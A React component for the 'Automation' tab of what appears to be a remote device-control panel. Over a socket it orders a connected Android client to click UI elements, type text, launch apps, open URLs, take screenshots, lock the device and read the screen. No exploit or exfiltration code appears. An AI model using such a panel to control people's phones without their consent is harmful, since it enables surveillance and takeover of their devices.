import { useState, useEffect } from 'react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Bot, MousePointerClick, Type, AppWindow, Link2, CornerUpLeft, Home, LayoutGrid, Play, RefreshCw } from 'lucide-react'
import { emitOrder, getSocket } from '@/lib/socket'

interface LaunchableApp {
  package: string
  name: string
  activity?: string
}

export function AutomationTab({ clientId }: { clientId: string }) {
  const [clickText, setClickText] = useState('')
  const [clickId, setClickId] = useState('')
  const [inputText, setInputText] = useState('')
  const [openApp, setOpenApp] = useState('')
  const [openAppName, setOpenAppName] = useState('')
  const [openUrl, setOpenUrl] = useState('')
  const [launchableApps, setLaunchableApps] = useState<LaunchableApp[]>([])
  const [loading, setLoading] = useState(false)

  useEffect(() => {
    const socket = getSocket()
    if (!socket) return

    const handler = (data: any) => {
      if (data.id !== clientId) return

      const msg = data.data
      if (msg && msg.type === 'launchable_apps') {
        console.log('📱 Received launchable apps:', msg.count)
        setLaunchableApps(msg.data || [])
        setLoading(false)
      }
    }

    socket.on('client_data', handler)
    return () => {
      socket.off('client_data', handler)
    }
  }, [clientId])

  const fetchApps = () => {
    setLoading(true)
    emitOrder(clientId, 'list_launchable', {})
    setTimeout(() => setLoading(false), 5000)
  }

  const handleAppSelect = (pkg: string) => {
    setOpenApp(pkg)
    const found = launchableApps.find(a => a.package === pkg)
    if (found) {
      setOpenAppName(found.name)
    }
  }

  const handleLaunchApp = () => {
    if (!openApp) return
    emitOrder(clientId, 'launch_app', {
      package: openApp,
      appName: openAppName || openApp
    })
  }

  const handleOpenUrl = () => {
    if (!openUrl) return
    emitOrder(clientId, 'open_url', { url: openUrl })
  }

  return (
    <div className="space-y-6 max-w-2xl">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Bot className="h-4 w-4 text-emerald-400" />
          <h3 className="text-sm font-semibold text-zinc-100">Automation</h3>
        </div>
        <Button
          variant="outline"
          size="sm"
          onClick={fetchApps}
          disabled={loading}
          className="h-7 bg-transparent border-white/15 text-zinc-400 hover:bg-white/5 text-xs"
        >
          <RefreshCw className={`h-3 w-3 mr-1 ${loading ? 'animate-spin' : ''}`} />
          {loading ? 'Loading...' : 'Refresh Apps'}
        </Button>
      </div>

      {/* ============ Click Actions ============ */}
      <Section icon={MousePointerClick} title="Click Actions">
        <Field
          label="Click by text"
          placeholder="e.g. Accept"
          value={clickText}
          onChange={setClickText}
          onSubmit={() => {
            emitOrder(clientId, 'click_text', { text: clickText })
          }}
        />
        <Field
          label="Click by View ID"
          placeholder="e.g. com.android.systemui:id/ok"
          value={clickId}
          onChange={setClickId}
          onSubmit={() => {
            emitOrder(clientId, 'click_id', { id: clickId })
          }}
        />
      </Section>

      {/* ============ Input Actions ============ */}
      <Section icon={Type} title="Input Actions">
        <Field
          label="Type text"
          placeholder="Text to type in focused field"
          value={inputText}
          onChange={setInputText}
          onSubmit={() => {
            emitOrder(clientId, 'input_text', { text: inputText })
          }}
        />
      </Section>

      {/* ============ App Management ============ */}
      <Section icon={AppWindow} title="App Management">
        {/* ⭐ Launch App */}
        <div className="space-y-2">
          <Label className="text-[10px] uppercase tracking-wider text-zinc-500">
            Open app {launchableApps.length > 0 && `(${launchableApps.length} available)`}
          </Label>

          {launchableApps.length > 0 ? (
            <div className="flex gap-2">
              <select
                value={openApp}
                onChange={(e) => handleAppSelect(e.target.value)}
                className="flex-1 bg-black/40 border border-white/10 rounded-md px-2 py-1.5 font-mono text-xs text-zinc-300 h-8 outline-none focus:ring-1 focus:ring-emerald-500/50"
              >
                <option value="">-- Select app --</option>
                {launchableApps.map((app) => (
                  <option key={app.package} value={app.package}>
                    {app.name} — {app.package}
                  </option>
                ))}
              </select>
              <Button
                onClick={handleLaunchApp}
                disabled={!openApp}
                size="sm"
                className="h-8 bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950"
              >
                <Play className="h-3 w-3 mr-1" /> Launch
              </Button>
            </div>
          ) : (
            <div className="flex gap-2 items-end">
              <div className="flex-1 space-y-1">
                <Input
                  value={openApp}
                  onChange={(e) => setOpenApp(e.target.value)}
                  placeholder="Package name e.g. com.android.settings"
                  className="bg-black/40 border-white/10 font-mono text-xs h-8"
                />
                <Input
                  value={openAppName}
                  onChange={(e) => setOpenAppName(e.target.value)}
                  placeholder="Display name e.g. Settings"
                  className="bg-black/40 border-white/10 font-mono text-xs h-8 mt-1"
                />
              </div>
              <Button
                onClick={handleLaunchApp}
                disabled={!openApp}
                size="sm"
                className="h-8 bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950"
              >
                <Play className="h-3 w-3 mr-1" /> Launch
              </Button>
            </div>
          )}

          <p className="text-[10px] text-zinc-500 mt-1">
            💡 Click "Refresh Apps" to load the app list from the device
          </p>
        </div>

        {/* ⭐ Open URL */}
        <Field
          label="Open URL"
          placeholder="https://google.com"
          value={openUrl}
          onChange={setOpenUrl}
          onSubmit={handleOpenUrl}
        />
      </Section>

      {/* ============ Navigation Gestures ============ */}
      <Section icon={LayoutGrid} title="Navigation Gestures">
        <div className="flex flex-wrap gap-2">
          <Button
            variant="outline"
            size="sm"
            onClick={() => emitOrder(clientId, 'nav_back', {})}
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5 h-8"
          >
            <CornerUpLeft className="h-3.5 w-3.5 mr-1" /> Back
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => emitOrder(clientId, 'nav_home', {})}
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5 h-8"
          >
            <Home className="h-3.5 w-3.5 mr-1" /> Home
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => emitOrder(clientId, 'nav_recents', {})}
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5 h-8"
          >
            <LayoutGrid className="h-3.5 w-3.5 mr-1" /> Recents
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => emitOrder(clientId, 'nav_notifications', {})}
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5 h-8"
          >
            Notifications
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => emitOrder(clientId, 'nav_quick_settings', {})}
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5 h-8"
          >
            Quick Settings
          </Button>
        </div>
      </Section>

      {/* ============ Extra Actions ============ */}
      <Section icon={Bot} title="Extra Actions">
        <div className="flex flex-wrap gap-2">
          <Button
            variant="outline"
            size="sm"
            onClick={() => emitOrder(clientId, 'take_screenshot', {})}
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5 h-8"
          >
            📸 Screenshot
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => emitOrder(clientId, 'lock_device', {})}
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5 h-8"
          >
            🔒 Lock Device
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => emitOrder(clientId, 'screen_reader_start', {})}
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5 h-8"
          >
            👁️ Read Screen
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => emitOrder(clientId, 'screen_reader_stop', {})}
            className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5 h-8"
          >
            🛑 Stop Reader
          </Button>
        </div>
      </Section>
    </div>
  )
}

/* ============ Helper Components ============ */

function Section({
  icon: Icon,
  title,
  children,
}: {
  icon: typeof Bot
  title: string
  children: React.ReactNode
}) {
  return (
    <div className="rounded-xl border border-white/10 bg-zinc-900/40 p-4">
      <div className="flex items-center gap-2 mb-3 text-xs uppercase tracking-wider text-zinc-500">
        <Icon className="h-3.5 w-3.5 text-emerald-400/80" />
        {title}
      </div>
      <div className="space-y-2">{children}</div>
    </div>
  )
}

function Field({
  label,
  placeholder,
  value,
  onChange,
  onSubmit,
}: {
  label: string
  placeholder: string
  value: string
  onChange: (v: string) => void
  onSubmit: () => void
}) {
  return (
    <div className="flex gap-2 items-end">
      <div className="flex-1 space-y-1">
        <Label className="text-[10px] uppercase tracking-wider text-zinc-500">
          {label}
        </Label>
        <Input
          value={value}
          onChange={(e) => onChange(e.target.value)}
          placeholder={placeholder}
          className="bg-black/40 border-white/10 font-mono text-xs h-8"
          onKeyDown={(e) => {
            if (e.key === 'Enter' && value) onSubmit()
          }}
        />
      </div>
      <Button
        onClick={onSubmit}
        disabled={!value}
        size="sm"
        className="h-8 bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950"
      >
        Run
      </Button>
    </div>
  )
}
